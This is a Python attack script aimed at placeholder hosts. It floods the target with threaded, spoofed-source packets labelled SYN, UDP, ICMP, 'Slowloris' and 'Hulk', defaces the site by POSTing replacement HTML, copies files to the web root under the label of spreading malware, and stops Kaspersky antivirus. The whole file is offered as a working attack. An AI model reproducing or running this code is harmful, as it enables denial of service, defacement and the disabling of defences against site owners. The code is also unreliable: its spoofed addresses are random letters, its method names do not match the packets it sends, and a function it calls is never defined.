import requests
import random
import string
import threading
from scapy.all import *
import socket
import subprocess
import os
from bs4 import BeautifulSoup

def generate_random_string(length):
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def send_attack_packet(target_url):
    target_ip = socket.gethostbyname(target_url)
    while True:
        source_ip = generate_random_string(10) + "." + generate_random_string(10) + "." + generate_random_string(10) + "." + generate_random_string(10)
        source_port = random.randint(1024, 65535)
        target_port = random.randint(80, 65535)
        attack_method = random.choice(["TCP", "Raw flood", "Volumetric flood", "Slowloris", "Hulk", "Syn Ack flood", "SSL/TLS", "spoofing"])

        if attack_method == "TCP":
            packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port)
        elif attack_method == "Raw flood":
            packet = IP(src=source_ip, dst=target_ip) / Raw(load="FLOOD")
        elif attack_method == "Volumetric flood":
            packet = IP(src=source_ip, dst=target_ip) / UDP(sport=source_port, dport=target_port)
        elif attack_method == "Slowloris":
            packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags="S")
        elif attack_method == "Hulk":
            packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags="S", options=[('Timestamp', (0, 0))])
        elif attack_method == "Syn Ack flood":
            packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags="S")
        elif attack_method == "SSL/TLS":
            packet = IP(src=source_ip, dst=target_ip) / TCP(sport=source_port, dport=target_port, flags="S", options=[('Timestamp', (0, 0))])
        elif attack_method == "spoofing":
            packet = IP(src=source_ip, dst=target_ip) / ICMP()

        send(packet, verbose=0)

def replace_website_contents(target_url, new_html_file):
    session = requests.Session()
    response = session.get(target_url)
    cookies = response.cookies

    headers = {
        "Content-Type": "text/html",
        "Cookie": "; ".join([f"{c.name}={c.value}" for c in cookies]),
    }

    with open(new_html_file, "r") as file:
        new_content = file.read()

    response = session.post(target_url, headers=headers, data=new_content)

    print(f"Website content replaced with {new_html_file}")

def spread_malware(target_server, html_file):
    subprocess.run(["scp", html_file, f"user@{target_server}:/var/www/html"])
    print(f"Successfully spread malware {html_file} to target server")

def disable_antivirus(target_server):
    command = "service Kaspersky stop"
    execute_remote_code(target_server, command)
    print(f"Antivirus on {target_server} has been disabled")

def find_html_files(target_url):
    session = requests.Session()
    response = session.get(target_url)
    soup = BeautifulSoup(response.content, "html.parser")
    html_files = []

    for link in soup.find_all("a"):
        href = link.get("href")
        if href.endswith(".html"):
            html_files.append(href)

    return html_files

def main():
    target_server = "target-server.com"  
    target_url = "https://target-website.com"  
    new_html_file = "path/to/your/new_html_file.html"  
    
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Edg/96.0.1054.62",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.130",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Vivaldi/5.0.2497.8",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 YaBrowser/21.11.0.1579 Yowser/2.5 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Edg/96.0.1054.62",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.130",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Vivaldi/5.0.2497.8",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 YaBrowser/21.11.0.1579 Yowser/2.5 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Edg/96.0.1054.62",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.130",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Vivaldi/5.0.2497.8",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 YaBrowser/21.11.0.1579 Yowser/2.5 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Edg/96.0.1054.62",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 OPR/82.0.4227.130",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Vivaldi/5.0.2497.8",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 YaBrowser/21.11.0.1579 Yowser/2.5 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36 Edg/96.0.1054.62",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/8.0.8 Safari/600.8.9",
        "Mozilla/5.0 (iPad; CPU OS 8_4_1 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H321 Safari/600.1.4",
        "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36 Edge/12.10240",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
        "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/600.7.12 (KHTML, like Gecko) Version/8.0.7 Safari/600.7.12",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.8.9 (KHTML, like Gecko) Version/7.1.8 Safari/537.85.17",
        "Mozilla/5.0 (iPad; CPU OS 8_4 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12H143 Safari/600.1.4",
        "Mozilla/5.0 (iPad; CPU OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) Version/8.0 Mobile/12F69 Safari/600.1.4"
    ]
    
    for _ in range(100000):
        t = threading.Thread(target=send_attack_packet, args=(target_url,))
        t.start()

    replace_website_contents(target_url, new_html_file)

    html_files = find_html_files(target_url)
    for html_file in html_files:
        spread_malware(target_server, html_file)

    disable_antivirus(target_server)

if __name__ == "__main__":
    main()                                         